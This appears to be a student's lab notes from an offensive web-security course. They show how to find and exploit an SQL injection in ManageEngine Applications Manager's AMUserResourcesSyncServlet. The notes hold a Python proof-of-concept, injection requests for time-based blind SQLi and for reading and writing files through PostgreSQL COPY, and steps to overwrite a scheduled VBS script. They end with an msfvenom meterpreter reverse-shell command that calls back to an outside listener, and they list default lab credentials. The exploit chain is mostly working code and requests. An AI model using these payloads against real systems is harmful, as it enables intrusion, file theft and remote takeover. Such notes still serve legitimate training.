Creds:

|URL|Username|Password|
|---|---|---|
|https://manageengine:8443/|admin|admin|
# Vulnerability Discovery 
*ManageEngine Applications Manager is an application performance monitoring solution that proactively monitors business applications and help businesses ensure their revenue-critical applications meet end user expectations. Applications Manager offers out of the box monitoring support for 80+ applications and servers.*

* Most URIs end in the `.do` extension: https://fileinfo.com/extension/do
![[3e8bfaa72eb15d3a48dc5291f8e99642-Picture1.png]]
* Try and find what versions being run:
	* Java/ Python version?
	* Host version etc
![[19e8e34e2b068e6d68883a2224c064d5-Picture6.png]]
* Search directory for key information
# Source Code Recovery 
* Rule out standard third party libraries like `struts.jar`, `xmlsec-1.3.0.jar`
* Look for interesting files: 
	* `AdventNetAppManagerWebClient.jar`
* Look in JD-Gui
	* Not good for searching, extract and open in an IDE?

* Is there a database being used? SQLi? 
	* Look for query strings
```Java
String query = "select count(*) from Alert where SEVERITY = " + i + " and groupname ='AppManager'";
```
Search for more `query`'s 

### Java HTTP Handlers
* Look for front end implementation and look for HTTP requests
	- _doGet_
	- _doPost_
	- _doPut_
	- _doDelete_
	- _doCopy_
	- _doOptions_
![[aae32ff2fabbc2d1927a397dda10c036-Picture25.png]]
* Typically `doPost` and `doGet` require 2 parameters
```Java
protected void doGet(HttpServletRequest req,
                     HttpServletResponse resp)
```

```Java
public class AMUserResourcesSyncServlet
19:   extends HttpServlet
20: {
21:   public void doPost(HttpServletRequest request, HttpServletResponse response)
22:     throws ServletException, IOException
23:   {
24:     doGet(request, response);
25:   }
26:   
27:   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
28:   {
29:     response.setContentType("text/html; charset=UTF-8");
30:     PrintWriter out = response.getWriter();
31:     String isSyncConfigtoUserMap = request.getParameter("isSyncConfigtoUserMap");
32:     if ((isSyncConfigtoUserMap != null) && ("true".equals(isSyncConfigtoUserMap)))
33:     {
34:       fetchAllConfigToUserMappingForMAS(out);
35:       return;
36:     }
37:     String masRange = request.getParameter("ForMasRange");
38:     String userId = request.getParameter("userId");
39:     String chkRestrictedRole = request.getParameter("chkRestrictedRole");
40:     AMLog.debug("[AMUserResourcesSyncServlet::(doGet)] masRange : " + masRange + ", userId : " + userId + " , chkRestrictedRole : " + chkRestrictedRole);
41:
42:     if ((chkRestrictedRole != null) && ("true".equals(chkRestrictedRole)))
43:     {
44:       boolean isRestricted = RestrictedUsersViewUtil.isRestrictedRole(userId);
45:       out.println(isRestricted);
46:
47:
48:     }
49:     else if (masRange != null) 
        {
50:       if ((userId != null) && (!"".equals(userId))) {
52:         fetchUserResourcesofMASForUserId(userId, masRange, out);
          } else {
56:         fetchAllUserResourcesForMAS(masRange, out);
57:       }
58:     }
```
* `doPost` simply forwards to `doGet`
* Lines 37-39 Get 3 Parameters
* Looking for these queries in JD-Gui shows that they are use within a `SELECT` function
![[559b6df0ce7b00de5a995bc1a6f217c2-Picture31 1.png]]
```Java
66:   public void fetchUserResourcesofMASForUserId(String userId, String masRange, PrintWriter out)
67:   {
68:     int stRange = Integer.parseInt(masRange);
69:     int endRange = stRange + EnterpriseUtil.RANGE;
70:     String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;
71:     AMLog.debug("[AMUserResourcesSyncServlet::(fetchUserResourcesofMASForUserId)] qry : " + qry);
72:     
73:     ResultSet rs = null;
74:     try
75:     {
76:       rs = AMConnectionPool.executeQueryStmt(qry);
77:       while (rs.next())
78:       {
79:         String resId = rs.getString(1);
80:         out.println(resId);
81:       }
82:     }
83:     catch (Exception ex)
84:     {
85:       ex.printStackTrace();
86:     }
87:     finally
88:     {
89:       AMConnectionPool.closeStatement(rs);
90:     }
91:   }
```
* Line 70 shows the SQL Query and line 76 executes it. Looking for when this function is called: 
```Java
42:     if ((chkRestrictedRole != null) && ("true".equals(chkRestrictedRole)))
43:     {
44:       boolean isRestricted = RestrictedUsersViewUtil.isRestrictedRole(userId);
45:       out.println(isRestricted);
46:
47:
48:     }
49:     else if (masRange != null) 
        {
50:       if ((userId != null) && (!"".equals(userId))) {
52:         fetchUserResourcesofMASForUserId(userId, masRange, out);
          } else {
56:         fetchAllUserResourcesForMAS(masRange, out);
57:       }
58:     }
``````
* Need to enter the `else if` statement. Then we can enter `fetchAllUserResourcesForMAS` and access the query.
# Triggering the Vuln
* We need a URL to trigger the vulnerability. 
* Within the `web.xml` we know the URL uses this:
Mapping:
```Java
<servlet-mapping>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <url-pattern>/servlet/AMUserResourcesSyncServlet</url-pattern>
</servlet-mapping>
```
Mapping Location:
```Java
<servlet>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <servlet-class>com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet</servlet-class>
</servlet>
```
* Need 2 paramaters to trigger:
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1
Host: manageengine:8443
```
Add the semi colon as there are no terminators in the query, so we can manually terminate it. 
```SQL
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE
where USERID=" + userId + " and RESOURCEID >" + stRange + " and
RESOURCEID < " + endRange;
```
# Convert into a POC
```Python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print "(+) usage %s <target>" % sys.argv[0]
		print "(+) eg: %s target" % sys.argv[0]
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print r.text
	print r.headers

if __name__ == '__main__':
	main()
```
```HTTP
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID_APM_9090=5A0EF105FBA016EA342E8B6F20B8FB63;
Path=/; Secure; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 0
Date: Sat, 26 Nov 2016 08:57:40 GMT
```
* Content length of 0,  is this good or bad? :( 
`C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log`
```Text
[ 2018-04-21 04:33:39.928 GMT ]:LOG:  execute <unnamed>: select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1
[ 2018-04-21 04:33:39.929 GMT ]:ERROR:  syntax error at or near "and" at character 2
[ 2018-04-21 04:33:39.929 GMT ]:STATEMENT:   and RESOURCEID >1 and RESOURCEID < 10000001
```
* Issues with no data in the SQL query can result in the misleading information. 
Change to time based to see.
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
select+pg_sleep(10); HTTP/1.1
Host: manageengine:8443
```


```CMD
[ 2018-04-21 04:42:58.221 GMT ]:ERROR:  operator does not exist: integer &# integer at character 73
[ 2018-04-21 04:42:58.221 GMT ]:HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
[ 2018-04-21 04:42:58.221 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
```
`1&#39` Can see special char is HTML encoded. 
* In my SQL you can hex encode the characters.
```mysql 
select concat('1337',' h@x0r')
```
```mysql
select concat(0x31333337,0x206840783072)
```
* Not possible in psql.
```psql
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
```
### Using CHR and String Concat
* Use individual characters using their code points and piping together.
```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
 ?column?
----------
 AWAE
```
* Only works on basic queries such as *SELECT*, *INSERT*, *DELETE* etc. 
```PSQL
amdb=# CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
CREATE TABLE
INSERT 0 1
amdb=# SELECT * from AWAE;
 offsec
--------
 AWAE
```
 ^Works
```PSQL
CREATE TABLE AWAE (offsec text);
INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
ERROR:  syntax error at or near "CHR"
LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH...
                              ^

********** Error **********
```
Doesnt work :(
### Lexical 
* PSQL supports Lexical Structure (https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html)
* 2 dollars can be used as a quote.
```PSQL
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;
```
```PSQL
CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
```
### POC
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ HTTP/1.0
Host: manageengine:8443
```
```PSQL
SELECT current_setting('is_superuser');
```
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
Host: manageengine:8443
```
* Will sleep for 10 seconds *if* the user is a  superuser.
* PSQL command injection
```psql
CREATE temp table awae (content text);
COPY awae from $$c:\awae.txt$$;
SELECT content from awae;
DROP table awae;
```
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0
Host: manageengine:8443
```
* Reading the first character of the file C:\awae.txt and comparing it with the letter "h". If the letter is "h", sleep for 10 seconds.
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+ HTTP/1.0
Host: manageengine:8443
```
## Reverse Shell
* One of the possible attacks is to overwrite an existing _batch_ file that is used by the ManageEngine application. The idea is that we can insert our malicious commands into a batch file that will get executed by the ManageEngine application.
* A more elegant way would be to introduce malicious code into the VBS files that are used by the ManageEngine application during normal operation.
* `C:\Program\ Files\ (x86)\ManageEngine\AppManager12\working\conf\application\scripts`
* run the Sysinternals Process Monitor[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/accessing-the-file-system-10613/reverse-shell-via-copy-to-10797#fn-local_id_103-1) tool with a _VBS_ path filter on our target host, we can see that one of the files that is executed on a regular basis is wmiget.vbs
![[57b2030e430d9e185c47f350b002c5f0-procmon.png]]
* Generate a meterpreter reverse shell payload and insert it at the end of the file
1. We need to make a backup copy of the target file as we will need to restore it once we are done with this attack vector.
2. We have to convert the content of the target file to a one-liner and make sure it is still executing properly before appending our payload. This is because _COPY\ TO_ can't handle newline control characters in a single _SELECT_ statement.
3. Our payload must also be on a single line for the same reason as stated above.
4. We have to encode our payload twice in the GET request. We need to use _base64_ encoding to avoid any issues with restricted characters within the _COPY TO_ function and we also need to _urlencode_ the payload so that nothing gets mangled by the web server itself. Finally, we need to use the _convert_from_ function to convert the output of the decode function to a human-readable format. The general query that we will use for the injection looks like this:
```PSQL
copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```
```shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
```
